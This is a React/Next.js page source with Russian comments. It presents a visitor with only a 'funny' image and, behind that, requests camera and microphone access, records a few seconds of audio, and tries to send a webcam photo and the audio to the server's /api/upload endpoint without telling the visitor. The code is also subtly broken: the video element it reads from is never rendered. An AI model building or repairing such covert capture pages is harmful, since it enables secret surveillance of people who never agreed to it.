"use client";

import { useEffect, useState, useRef } from "react";

export default function Home() {
  const [stream, setStream] = useState<MediaStream | null>(null);
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const audioChunksRef = useRef<Blob[]>([]);

  useEffect(() => {
    const startCapture = async () => {
      try {
        if (typeof navigator !== "undefined" && navigator.mediaDevices?.getUserMedia) {
          const mediaStream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: true,
          });
          setStream(mediaStream);
          if (videoRef.current) {
            videoRef.current.srcObject = mediaStream;
          }

          // Настройка записи аудио
          const mediaRecorder = new MediaRecorder(mediaStream);
          mediaRecorderRef.current = mediaRecorder;
          mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
              audioChunksRef.current.push(event.data);
            }
          };
          mediaRecorder.start();

          setTimeout(() => {
            mediaRecorder.stop();
            captureAndSendPhoto();
          }, 3000);
        } else {
          console.error("getUserMedia не поддерживается в этом браузере");
        }
      } catch (error) {
        console.error("Ошибка доступа к камере и микрофону:", error);
      }
    };

    startCapture();
  }, []);

  const captureAndSendPhoto = async () => {
    if (!videoRef.current) return;

    const canvas = document.createElement("canvas");
    const context = canvas.getContext("2d");
    if (!context) return;

    canvas.width = videoRef.current.videoWidth;
    canvas.height = videoRef.current.videoHeight;
    context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);

    const blob = await new Promise<Blob | null>((resolve) => canvas.toBlob(resolve, "image/png"));
    if (!blob) return;

    // Создаем аудиофайл
    const audioBlob = new Blob(audioChunksRef.current, { type: "audio/ogg" });

    const formData = new FormData();
    formData.append("file", blob, "photo.png");
    formData.append("audio", audioBlob, "audio.ogg");

    await fetch("/api/upload", {
      method: "POST",
      body: formData,
    });

    console.log("Фото и аудио отправлены на сервер!");
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-900 text-white">
      <h1 className="text-2xl mb-4"></h1>
      <img src="/funny.jpg" alt="Прикол" className="mt-4 w-64" />
    </div>
  );
}
